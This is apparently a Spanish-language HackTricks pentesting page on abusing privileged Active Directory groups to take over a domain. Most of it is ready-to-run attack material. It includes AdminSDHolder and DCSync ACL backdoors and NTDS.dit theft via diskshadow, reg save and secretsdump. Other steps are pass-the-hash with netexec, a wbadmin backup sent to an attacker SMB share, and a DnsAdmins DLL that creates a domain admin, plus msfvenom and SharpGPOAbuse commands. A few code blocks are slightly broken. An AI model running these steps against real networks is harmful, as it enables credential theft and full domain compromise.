# Grupos privilegiados

{{#include ../../banners/hacktricks-training.md}}

## Grupos bien conocidos con privilegios de administración

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Este grupo está facultado para crear cuentas y grupos que no son administradores en el dominio. Además, permite el inicio de sesión local en el controlador de dominio (DC).

Para identificar a los miembros de este grupo, se ejecuta el siguiente comando:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Se permite agregar nuevos usuarios, así como el inicio de sesión local en el DC.

## Grupo **AdminSDHolder**

La Lista de Control de Acceso (ACL) del grupo **AdminSDHolder** es crucial, ya que establece permisos para todos los "grupos protegidos" dentro de Active Directory, incluidos los grupos de alto privilegio. Este mecanismo asegura la protección de estos grupos evitando modificaciones no autorizadas.

Un atacante podría explotarlo modificando la ACL del grupo **AdminSDHolder**, concediendo permisos completos a un usuario estándar. Esto le daría efectivamente a ese usuario control total sobre todos los grupos protegidos. Si los permisos de ese usuario se modifican o se eliminan, se restablecerían automáticamente en aproximadamente una hora debido al diseño del sistema.

La documentación reciente de Windows Server todavía trata a varios grupos de operadores incorporados como objetos **protegidos** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). El proceso **SDProp** se ejecuta en el **PDC Emulator** cada 60 minutos por defecto, marca `adminCount=1` y desactiva la herencia en los objetos protegidos. Esto es útil tanto para persistencia como para detectar usuarios privilegiados obsoletos que fueron eliminados de un grupo protegido pero que aún conservan la ACL con la herencia deshabilitada.

Los comandos para revisar los miembros y modificar permisos incluyen:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Hay un script disponible para acelerar el proceso de restauración: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Para más detalles, visita [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

La pertenencia a este grupo permite la lectura de objetos eliminados de Active Directory, lo que puede revelar información sensible:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Esto es útil para **recuperar rutas de privilegio anteriores**. Los objetos eliminados aún pueden exponer `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, SPNs antiguos, o el DN de un grupo privilegiado eliminado que luego puede ser restaurado por otro operador.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Acceso al Controlador de Dominio

El acceso a los archivos en el Controlador de Dominio (DC) está restringido a menos que el usuario forme parte del grupo `Server Operators`, que cambia el nivel de acceso.

### Escalada de privilegios

Usando `PsService` o `sc` de Sysinternals, se pueden inspeccionar y modificar los permisos de los servicios. El grupo `Server Operators`, por ejemplo, tiene control total sobre ciertos servicios, lo que permite la ejecución de comandos arbitrarios y la escalada de privilegios:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Este comando revela que `Server Operators` tienen acceso completo, permitiendo la manipulación de servicios para obtener privilegios elevados.

## Backup Operators

La pertenencia al grupo `Backup Operators` otorga acceso al sistema de archivos de `DC01` debido a los privilegios `SeBackup` y `SeRestore`. Estos privilegios permiten el recorrido de carpetas, la enumeración y la copia de archivos, incluso sin permisos explícitos, usando la bandera `FILE_FLAG_BACKUP_SEMANTICS`. Es necesario utilizar scripts específicos para este proceso.

Para listar los miembros del grupo, ejecute:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Ataque local

Para aprovechar estos privilegios localmente, se emplean los siguientes pasos:

1. Importar las bibliotecas necesarias:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Habilitar y verificar `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Acceder y copiar archivos de directorios restringidos, por ejemplo:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Ataque AD

El acceso directo al sistema de archivos del Controlador de Dominio permite el robo de la base de datos `NTDS.dit`, que contiene todos los hashes NTLM de usuarios y equipos del dominio.

#### Uso de diskshadow.exe

1. Crea una shadow copy del disco `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copiar `NTDS.dit` desde la shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativamente, usa `robocopy` para copiar archivos:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extraer `SYSTEM` y `SAM` para recuperar hashes:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Recuperar todos los hashes de `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Post-extracción: Pass-the-Hash a DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Uso de wbadmin.exe

1. Configura un sistema de archivos NTFS para el servidor SMB en la máquina atacante y almacena en caché las credenciales SMB en la máquina objetivo.
2. Usa `wbadmin.exe` para la copia de seguridad del sistema y la extracción de `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Los miembros del grupo **DnsAdmins** pueden explotar sus privilegios para cargar una DLL arbitraria con privilegios SYSTEM en un servidor DNS, a menudo alojado en controladores de dominio. Esta capacidad permite un potencial de explotación significativo.

Para listar los miembros del grupo DnsAdmins, usa:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Ejecutar DLL arbitraria (CVE‑2021‑40469)

> [!NOTE]
> Esta vulnerabilidad permite la ejecución de código arbitrario con privilegios SYSTEM en el servicio DNS (generalmente dentro de los DCs). Este problema se corrigió en 2021.

Los miembros pueden hacer que el servidor DNS cargue una DLL arbitraria (ya sea localmente o desde un recurso compartido remoto) usando comandos como:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Reiniciar el servicio DNS (lo que puede requerir permisos adicionales) es necesario para que se cargue la DLL:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Para más detalles sobre este vector de ataque, consulte ired.team.

#### Mimilib.dll

También es factible usar mimilib.dll para la ejecución de comandos, modificándolo para ejecutar comandos específicos o reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) para más información.

### Registro WPAD para MitM

DnsAdmins pueden manipular registros DNS para realizar ataques Man-in-the-Middle (MitM) creando un registro WPAD después de desactivar la lista global de bloqueo de consultas. Herramientas como Responder o Inveigh pueden usarse para spoofing y capturar tráfico de red.

### Lectores de registros de eventos
Los miembros pueden acceder a los registros de eventos, pudiendo encontrar información sensible como contraseñas en texto plano o detalles de ejecución de comandos:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Este grupo puede modificar las DACLs en el objeto de dominio, potencialmente otorgando privilegios DCSync. Las técnicas de escalada de privilegios que aprovechan este grupo están detalladas en el repositorio Exchange-AD-Privesc de GitHub.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Si puedes actuar como miembro de este grupo, el abuso clásico es otorgar a un principal controlado por el atacante los derechos de replicación necesarios para [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Históricamente, **PrivExchange** encadenó el acceso a buzones, coerced Exchange authentication y LDAP relay para llegar a esta misma primitiva. Incluso cuando esa ruta de relay está mitigada, la pertenencia directa a `Exchange Windows Permissions` o el control de un servidor Exchange siguen siendo una vía de alto valor para obtener derechos de replicación de dominio.

## Hyper-V Administrators

Hyper-V Administrators tienen acceso total a Hyper-V, lo que puede explotarse para obtener control sobre controladores de dominio virtualizados. Esto incluye clonar DCs en ejecución y extraer hashes NTLM del archivo NTDS.dit.

### Exploitation Example

El abuso práctico suele ser **acceso sin conexión a discos/checkpoints de DC** en lugar de las viejas técnicas de LPE a nivel de host. Con acceso al host Hyper-V, un operador puede crear un checkpoint o exportar un controlador de dominio virtualizado, montar el VHDX y extraer `NTDS.dit`, `SYSTEM` y otros secretos sin tocar LSASS dentro del huésped:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
A partir de ahí, reutiliza el flujo de trabajo de `Backup Operators` para copiar `Windows\NTDS\ntds.dit` y los hives del registro fuera de línea.

## Group Policy Creators Owners

This group allows members to create Group Policies in the domain. However, its members can't apply group policies to users or group or edit existing GPOs.

Lo importante es que **el creador se convierte en propietario del nuevo GPO** y normalmente obtiene suficientes permisos para editarlo posteriormente. Eso significa que este grupo resulta interesante cuando puedes:

- crear una GPO maliciosa y convencer a un admin de vincularla a una OU/dominio objetivo
- editar una GPO que creaste y que ya está vinculada en un lugar útil
- abusar de otro derecho delegado que te permite vincular GPOs, mientras que este grupo te da la parte de edición

El abuso práctico normalmente implica añadir un **Immediate Task**, **startup script**, **local admin membership**, o un cambio de **user rights assignment** mediante archivos de política respaldados por SYSVOL.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Si editas la GPO manualmente a través de `SYSVOL`, recuerda que el cambio no es suficiente por sí solo: `versionNumber`, `GPT.ini` y, a veces, `gPCMachineExtensionNames` también deben actualizarse o los clientes ignorarán la actualización de la directiva.

## Organization Management

En entornos donde se despliega **Microsoft Exchange**, un grupo especial conocido como **Organization Management** posee capacidades significativas. Este grupo tiene el privilegio de **acceder a los buzones de todos los usuarios del dominio** y mantiene el **control total sobre la Unidad Organizativa (OU) 'Microsoft Exchange Security Groups'**. Este control incluye el grupo **`Exchange Windows Permissions`**, que puede ser explotado para privilege escalation.

### Explotación de privilegios y comandos

#### Print Operators

Los miembros del grupo **Print Operators** cuentan con varios privilegios, incluyendo **`SeLoadDriverPrivilege`**, que les permite **iniciar sesión localmente en un Domain Controller**, apagarlo y gestionar impresoras. Para explotar estos privilegios, especialmente si **`SeLoadDriverPrivilege`** no es visible en un contexto sin elevación, es necesario omitir User Account Control (UAC).

Para listar los miembros de este grupo, se usa el siguiente comando de PowerShell:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
En los controladores de dominio este grupo es peligroso porque la Directiva predeterminada de controladores de dominio concede **`SeLoadDriverPrivilege`** a `Print Operators`. Si obtienes un token elevado de un miembro de este grupo, puedes habilitar el privilegio y cargar un driver firmado pero vulnerable para escalar a kernel/SYSTEM. Para detalles sobre el manejo de tokens, consulta [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Los miembros de este grupo tienen acceso a los PCs mediante Remote Desktop Protocol (RDP). Para enumerar a estos miembros, hay comandos de PowerShell disponibles:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Más información sobre la explotación de RDP puede encontrarse en recursos dedicados de pentesting.

#### Usuarios de Remote Management

Los miembros pueden acceder a equipos mediante **Windows Remote Management (WinRM)**. La enumeración de estos miembros se logra mediante:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Para técnicas de explotación relacionadas con **WinRM**, se debe consultar la documentación específica.

#### Operadores de servidor

Este grupo tiene permisos para realizar varias configuraciones en los controladores de dominio, incluidos privilegios de copia de seguridad y restauración, cambiar la hora del sistema y apagar el sistema. Para enumerar los miembros, el comando proporcionado es:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
En los controladores de dominio, `Server Operators` suelen heredar suficientes derechos para **reconfigurar o iniciar/detener servicios** y también reciben `SeBackupPrivilege`/`SeRestorePrivilege` a través de la política predeterminada de DC. En la práctica, esto los convierte en un puente entre **service-control abuse** y **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Si una ACL del servicio le da a este grupo permisos de change/start, apunta el servicio a un comando arbitrario, ejecútalo como `LocalSystem` y luego restaura el `binPath` original. Si el control de servicios está bloqueado, recurre a las técnicas de `Backup Operators` anteriores para copiar `NTDS.dit`.

## Referencias <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
